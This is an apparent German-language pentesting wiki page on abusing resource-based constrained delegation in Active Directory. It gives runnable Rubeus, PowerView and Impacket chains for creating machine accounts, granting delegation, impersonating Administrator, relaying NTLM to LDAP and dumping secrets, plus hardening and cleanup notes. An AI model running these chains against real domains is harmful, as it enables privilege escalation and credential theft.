# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen von Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) ähnelt [constrained delegation](constrained-delegation.md), aber die Vertrauensrichtung ist umgekehrt. Bei der herkömmlichen constrained delegation wird festgelegt, an welche Services ein Principal delegieren darf; RBCD legt auf der **Zielressource** fest, welche Principals Benutzer gegenüber dieser Ressource impersonieren dürfen.<sup>[[12]](#references)</sup>

Das Attribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ des Zielobjekts enthält einen Sicherheitsdeskriptor, der die Principals identifiziert, die berechtigt sind, gegenüber dieser Ressource im Namen anderer Identitäten zu handeln.

Ein weiterer wichtiger Unterschied besteht darin, dass ein Principal mit ausreichenden **Schreibberechtigungen über ein Computerkonto** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` und ähnliche Rechte) möglicherweise _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ setzen kann. Das Konfigurieren der herkömmlichen constrained delegation erfordert normalerweise privilegierteren administrativen Zugriff.<sup>[[1]](#references)</sup>

Genauer gesagt wird das Ändern der Einstellungen für die klassische constrained delegation normalerweise durch `SeEnableDelegationPrivilege` auf einem Domain Controller eingeschränkt. Dieses Recht besitzen typischerweise hochprivilegierte Administratoren. RBCD verlagert die Entscheidung auf den Sicherheitsdeskriptor des Zielobjekts, sodass Schreibzugriff auf die relevante Eigenschaft des Computerobjekts ohne dieses Benutzerrecht ausreichen kann.<sup>[[1]](#references)[[2]](#references)</sup>

### Neue Konzepte

Das Flag **`TrustedToAuthForDelegation`** in `userAccountControl` wird oft als Voraussetzung für **S4U2Self** beschrieben, was jedoch unvollständig ist.\
Ein Service Principal mit einem SPN kann S4U2Self auch ohne dieses Flag anfordern. Mit `TrustedToAuthForDelegation` ist das zurückgegebene Service-Ticket **forwardable**; ohne dieses Flag ist das Ticket normalerweise **non-forwardable**.<sup>[[5]](#references)</sup>

Die herkömmliche constrained delegation lehnt ein **non-forwardable TGS** im S4U2Proxy-Schritt ab. RBCD kann dieses S4U2Self-Ticket akzeptieren, wenn der Sicherheitsdeskriptor des Ziels den anfragenden Service autorisiert.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Struktur des Angriffs

> Wenn du **Schreibrechte-äquivalente Berechtigungen** über ein **Computerkonto** hast, kannst du möglicherweise privilegierten Zugriff auf diese Maschine erlangen.

Angenommen, der Angreifer verfügt bereits über **Schreibrechte-äquivalente Berechtigungen über das Computerobjekt des Opfers**.

1. Der Angreifer **kompromittiert** ein Konto mit einem **SPN** oder **erstellt eines** ("Service A"). Standardmäßig kann ein authentifizierter Domain-Benutzer bis zu 10 Computerobjekte erstellen, gesteuert durch **_MachineAccountQuota_**; ein Computerobjekt stellt automatisch verwendbare SPNs bereit.
2. Der Angreifer **missbraucht seine WRITE-Berechtigung** über den Computer des Opfers (ServiceB), um resource-based constrained delegation so zu konfigurieren, dass ServiceA jeden Benutzer gegenüber diesem Computer des Opfers (ServiceB) impersonieren darf.
3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A zu Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
1. S4U2Self (vom kompromittierten oder erstellten SPN-Konto): Ein **TGS, der Administrator gegenüber Service A repräsentiert**, anfordern (non-forwardable).
2. S4U2Proxy: Dieses **non-forwardable TGS** verwenden, um ein Service-Ticket anzufordern, das **Administrator** gegenüber dem **Host des Opfers** repräsentiert.
3. Das non-forwardable Ticket kann in diesem RBCD-Ablauf trotzdem funktionieren, da Service A im Sicherheitsdeskriptor der Zielressource autorisiert ist.
4. Der Angreifer kann **pass-the-ticket** durchführen und den Benutzer **impersonieren**, um **Zugriff auf den Opfer-ServiceB** zu erlangen.<sup>[[1]](#references)</sup>

Um die _**MachineAccountQuota**_ der Domain zu überprüfen, kannst du Folgendes verwenden:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Du kannst ein Computerobjekt innerhalb der Domäne mit **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> erstellen.
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren von Resource-based Constrained Delegation

**Verwendung des Active Directory PowerShell-Moduls**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Verwendung von powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführung eines vollständigen S4U attack (Windows/Rubeus)

Zunächst haben wir das neue Computer-Objekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies gibt die RC4- und AES-Hashes für dieses Konto aus.\
Nun kann der Angriff durchgeführt werden:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Sie können weitere Tickets für zusätzliche Services generieren, indem Sie den `/altservice`-Parameter von Rubeus nur einmal angeben:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Benutzer können als **„Konto ist vertraulich und kann nicht delegiert werden.“** markiert werden. Wenn dieses Flag aktiviert ist, kann das Konto über diesen Delegation-Flow nicht impersonated werden. BloodHound zeigt diese Eigenschaft während der Analyse an.

### Linux-Tools: End-to-End-RBCD mit Impacket (2024+)

Wenn du von Linux aus arbeitest, kannst du die vollständige RBCD-Kette mit den offiziellen Impacket-Tools durchführen:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Hinweise
- Wenn LDAP signing/LDAPS erzwungen wird, verwende `impacket-rbcd -use-ldaps ...`.
- Bevorzuge AES-Schlüssel; viele moderne Domänen schränken RC4 ein. Impacket und Rubeus unterstützen beide AES-only-Flows.
- Impacket kann für einige Tools den `sname` ("AnySPN") umschreiben, aber ermittle nach Möglichkeit den korrekten SPN (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

Wenn der **delegierende Principal**, den du kontrollierst, in einer **anderen Domäne** (oder sogar einer **anderen Forest**) als der **Ressourcencomputer** liegt, handelt es sich weiterhin um **RBCD**, aber der Ticket-Flow ist nicht mehr der übliche `S4U2Self -> S4U2Proxy` innerhalb einer einzelnen Domäne.

### Cross-domain RBCD: den fremden Principal per SID konfigurieren

Wenn du `msDS-AllowedToActOnBehalfOfOtherIdentity` aus einer **anderen Domäne** setzt, kann der fremde Computer/Benutzer im LDAP der Zieldomäne möglicherweise **nicht per Namen aufgelöst werden**. Konfiguriere in diesem Fall den Delegation-Eintrag mithilfe der **SID** des fremden Principals anstelle seines sAMAccountName/UPN.

Dies ist besonders relevant, wenn du NTLM an LDAP mit `ntlmrelayx.py` relayst:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notizen:
- `--sid` weist `ntlmrelayx.py` an, `--escalate-user` als SID zu behandeln. Dies ist erforderlich, wenn das delegierende Konto aus einer anderen Domain als der Zieldomain stammt.
- Selbst wenn das Tool `User not found in LDAP` ausgibt, kann der Delegation-Write erfolgreich sein, da der Security Descriptor die fremde SID direkt speichert.

### Cross-domain RBCD: Cross-realm-S4U-Sequenz

Sobald sich der fremde Principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` befindet, ist der funktionierende Cross-domain-Ablauf:<sup>[[9]](#references)[[13]](#references)</sup>

1. Ein **TGT** für den delegierenden Principal aus dessen eigener Domain abrufen.
2. Ein **Referral-TGT** für `krbtgt/<target-domain>` anfordern.
3. Einen **Cross-realm-S4U2Self-Referral** für den zu impersonierenden Benutzer beim Domain Controller der Zieldomain anfordern.
4. Das eigentliche **S4U2Self**-Ticket für diesen Benutzer zurück in der delegierenden Domain anfordern.
5. **S4U2Proxy** in der delegierenden Domain ausführen, um ein Referral-Ticket für die Zieldomain zu erhalten.
6. Das abschließende **S4U2Proxy** auf dem Domain Controller der Zieldomain ausführen, um das Service-Ticket für `cifs/host.target`, `host/host.target` usw. zu erhalten.

Dies ist der Grund, warum Standard-Linux-Tools bei Cross-domain RBCD häufig fehlschlagen:<sup>[[9]](#references)</sup>
- Der **Realm** der Anfrage muss sich möglicherweise vom Realm des im `TGS-REQ` verwendeten TGT unterscheiden.
- Die Kette benötigt **unabhängige S4U2Proxy-Schritte**, nicht nur **S4U2Self** oder **S4U2Self**, unmittelbar gefolgt von einem einzelnen **S4U2Proxy**.

### Cross-domain RBCD unter Linux

Synacktiv hat eine Impacket-Implementierung von `getST.py` veröffentlicht, die die Cross-realm-Sequenz unter Linux reproduziert, indem sie die beiden KDCs explizit verarbeitet:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Die neuen Argumente lauten:
- `-dc-ip`: DC der **delegierenden** Domain
- `-targetdomain`: Domain des **Ressourcencomputers**
- `-targetdc`: DC der **Ressourcen**-Domain

### Einschränkungen von Cross-forest RBCD

Cross-forest RBCD hat eine wichtige Einschränkung: **Der impersonifizierte Benutzer muss derselben Forest wie der delegierende Principal angehören**. Wenn sich dein kontrolliertes Maschinenkonto also in `valhalla.local` befindet und die Zielressource in `asgard.local`, kannst du im Allgemeinen **keine beliebigen `asgard.local`-Benutzer** über RBCD für diese Ressource impersonifizieren.<sup>[[9]](#references)</sup>

Es ist weiterhin ausnutzbar, wenn:
- der Benutzer der **delegierenden Forest** ein **local admin** (oder anderweitig privilegiert) auf dem Ressourcenhost in der anderen Forest ist
- ein Trust den erforderlichen Authentifizierungspfad erlaubt und die fremde SID im Security Descriptor des Zielcomputers akzeptiert wird

### Protokollbesonderheiten von Cross-forest RBCD

Cross-forest RBCD ist nicht einfach nur „Cross-domain plus ein Trust“. Der beobachtete Ablauf umfasst zwei Besonderheiten, die von gängigen Tools historisch übersehen werden:<sup>[[9]](#references)</sup>

1. Eine zusätzliche **S4U2Proxy**-Anfrage, die **`PA-PAC-OPTIONS=branch-aware`** setzt
2. Ein finales Service-Ticket, das möglicherweise über **RC4** zurückgegeben wird, selbst wenn andere Etypes angefordert wurden

Der praktische Ablauf ist:

1. Ein TGT für den delegierenden Principal in Forest A abrufen.
2. **S4U2Self** für den zu impersonifizierenden Benutzer in Forest A anfordern.
3. **S4U2Proxy** in Forest A anfordern, um ein Referral-TGT für Forest B zu erhalten.
4. Ein zweites **S4U2Proxy** in Forest A **ohne das S4U2Self-Ticket als zusätzliches Ticket**, aber mit aktiviertem `branch-aware`, senden, um ein weiteres Referral-TGT für Forest B zu erhalten.
5. Optional ein normales Service-Ticket in Forest B für den delegierenden Principal anfordern (dieses Ticket ist für den finalen Abuse nicht erforderlich).
6. Die Referral-Tickets aus den Schritten 3 und 4 verwenden, um das finale **S4U2Proxy**-Ticket in Forest B für den zu impersonifizierenden Forest-A-Benutzer beim Ziel-SPN anzufordern.

### Cross-forest RBCD von Linux

Der gleiche Synacktiv-Impacket-Branch fügt für diese Logik einen `-forest`-Switch hinzu:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekursives Multi-Domain-RBCD (3+ Domains)

In **Multi-Domain-Forests** können sowohl **S4U2Self** als auch **S4U2Proxy** **rekursiv** sein, anstatt nach einer Weiterleitung zu stoppen:

- **Rekursives S4U2Self**: Das erste `S4U2Self` wird an die **Domain des impersonierten Benutzers** gesendet. Dazwischenliegende Parent-/Child-Hops werden mit normalen `TGS-REQ`-Weiterleitungen für `krbtgt/<REALM>` durchlaufen, und das **abschließende `S4U2Self`** wird in der eigenen Domain des **delegierenden Principals** gesendet.
- Das bedeutet, dass bereits der **Besitz eines TGTs** für ein Maschinenkonto ausreichen kann, um sich als **Admin aus einer anderen Domain desselben Forests** auszugeben und `cifs/host`, `host/host`, `wsman/host` usw. anzufordern.
- **Rekursives S4U2Proxy** folgt der Vertrauenskette auf dieselbe Weise: Bei Zwischen-Hops wird das vorherige Ticket wieder als TGT verwendet, während die nächste `krbtgt/<REALM>`-Weiterleitung angefordert wird. Nur der letzte Hop gibt das finale Service-Ticket zurück.<sup>[[10]](#references)</sup>

Ein praktisches Beispiel innerhalb desselben Forests ist:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less domainübergreifendes / forestübergreifendes RBCD

Wenn der **delegierende Principal ein Benutzer ohne SPN** ist, schlägt der letzte rekursive `S4U2Self` mit **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** fehl. Der Workaround besteht darin, **nur den letzten Hop als `S4U2Self+U2U`** erneut auszuführen.<sup>[[10]](#references)</sup>

Kurzfassung der Abuse-Kette:

1. Mit dem **NT-Hash** authentifizieren, damit der KDC in Richtung **RC4-HMAC (Etype 23)** gelenkt wird.
2. Zuerst **`-self -u2u`** anfordern und dieses Ticket getrennt vom späteren Proxy-Schritt aufbewahren.
3. Den **TGT-Session-Key** mit `describeTicket.py` extrahieren.
4. Den **NT-Hash** des Benutzers mit diesem **Session-Key** unter Verwendung von `changepasswd.py -newhashes <session_key>` ersetzen.
5. Das `S4U2Self+U2U`-Ticket bei einer separaten **`-proxy`**-Anfrage erneut als **`-additional-ticket`** verwenden.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Betriebliche Hinweise:

- Wenn der **erste vertrauenswürdige Hop bereits eine andere Forest ist**, sollte der **branch-aware**-Algorithmus (`getST.py ... -forest`) verwendet werden, um das native Verhalten von Windows nachzubilden. Wenn die fremde Forest erst **später** in der Kette erreicht wird, kann der nicht branch-aware rekursive Ablauf weiterhin funktionieren.<sup>[[9]](#references)</sup>
- Auf aktuellen **Windows Server 2022/2025**-DCs kann erzwungenes RC4 mit **`KDC_ERR_ETYPE_NOSUPP`** fehlschlagen, da RC4 veraltet ist. Dadurch kann **SPN-less RBCD** unmöglich werden, obwohl klassisches SPN-basiertes RBCD weiterhin mit AES funktioniert.<sup>[[15]](#references)</sup>
- Führe **`S4U2Self+U2U` vor der Änderung des Hashes/Passworts des Benutzers** aus: `SamrChangePasswordUser` berechnet die Kerberos-AES-Schlüssel des Kontos **nicht** neu. Wenn die Passwortänderung zuerst erfolgt, können spätere Ticket-Anfragen fehlschlagen.<sup>[[14]](#references)</sup>
- Das impersonifizierte Konto muss weiterhin **delegierbar** sein: **Protected Users** sowie Konten mit **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** blockieren die Kette.

## Hinweise zur Erkennung / Härtung

- RBCD-Pfade über Domains/Forests hinweg werden weiterhin üblicherweise durch **ACL-Missbrauch** oder **relay-to-LDAP** erstellt. Erzwinge **LDAP signing** und **LDAP channel binding** auf DCs, um gängige Setup-Pfade zu unterbrechen.
- Überwache, wer `msDS-AllowedToActOnBehalfOfOtherIdentity` auf Computerobjekten schreiben kann, und löse die gespeicherten SIDs auf, einschließlich **foreign security principals**.
- Prüfe in Umgebungen mit vielen Trusts **Selective Authentication**, **SID filtering** und, ob Benutzer aus einer fremden Forest über **local admin**-Rechte auf Ressourcenhosts verfügen.

### Zugriff

Die letzte Befehlszeile führt den **vollständigen S4U-Angriff** aus und injiziert den **TGS** von Administrator zum Zielhost in den **Arbeitsspeicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst von Administrator angefordert, daher kannst du auf **C$** zugreifen:
```bash
ls \\victim.domain.local\C$
```
### Unterschiedliche Service Tickets missbrauchen

Erfahre mehr über die [**hier verfügbaren Service Tickets**](silver-ticket.md#available-services).

## Aufzählung, Auditing und Bereinigung

### Computer mit konfiguriertem RBCD aufzählen

PowerShell (Dekodierung der SD zur Auflösung der SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (mit einem Befehl lesen oder leeren):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du nur den RC4-Hash angibst. Übergib Rubeus mindestens den AES256-Hash (oder einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** während `-self` für einen normalen Benutzer: Der delegierende Principal hat wahrscheinlich **keinen SPN**. Wiederhole den **letzten Hop** als **`S4U2Self+U2U`** statt als reguläres **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** während **SPN-less RBCD**: Aktuelle DCs können den erzwungenen **RC4-HMAC**-Pfad ablehnen, der für den Trick mit **`S4U2Self+U2U`** und Session-Key-Substitution erforderlich ist. Versuche stattdessen einen klassischen **SPN-backed**-RBCD-Pfad mit AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und Kerberos nicht ordnungsgemäß funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername und die Hashes für die Anmeldung nicht funktionieren. Möglicherweise hast du beim Generieren der Hashes das `$` im Benutzernamen vergessen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
- **`KDC_ERR_BADOPTION`**: Dies kann Folgendes bedeuten:
- Der Benutzer, den du impersonieren möchtest, kann nicht auf den gewünschten Service zugreifen (weil du ihn nicht impersonieren kannst oder weil er nicht über ausreichende Berechtigungen verfügt).
- Der angeforderte Service existiert nicht (wenn du ein Ticket für WinRM anforderst, WinRM aber nicht ausgeführt wird).
- Der erstellte Fakecomputer hat seine Berechtigungen über den verwundbaren Server verloren und du musst sie ihm wieder gewähren.
- Du missbrauchst klassisches KCD; beachte, dass RBCD mit nicht weiterleitbaren S4U2Self-Tickets funktioniert, während KCD weiterleitbare Tickets erfordert.

## Hinweise, Relays und Alternativen

- Du kannst die RBCD-SD auch über Active Directory Web Services (ADWS) schreiben, wenn LDAP gefiltert wird. Siehe:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig in RBCD, um in einem Schritt lokales SYSTEM zu erreichen. Siehe praktische End-to-End-Beispiele:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Wenn LDAP-Signing/Channel-Binding **deaktiviert** ist und du ein Machine Account erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP relayn, `msDS-AllowedToActOnBehalfOfOtherIdentity` für deinen Machine Account am Zielcomputerobjekt setzen und dich anschließend direkt über S4U von außerhalb des Hosts als **Administrator** impersonieren.<sup>[[8]](#references)</sup>

## References

- [1] [Den Hund wedeln lassen: Missbrauch von Resource-Based Constrained Delegation zum Angriff auf Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Noch ein Wort zur Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Übernahme eines Computerobjekts](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Missbrauch von Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity hat die Domain getötet: Ein offensiver Kerberos-Überblick](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (offiziell)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Kurzes Linux-Cheatsheet mit aktueller Syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP-Signing deaktiviert → Kerberos-Relay zu RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv – Untersuchung von domain- und forestübergreifendem RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv – Untersuchung von domain- und forestübergreifendem RBCD: Teil 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv-Impacket-Branch – cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn – Überblick über Kerberos Constrained Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications – Domainübergreifendes S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications – SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn – RC4-Nutzung in Kerberos erkennen und beheben](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Details zu S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
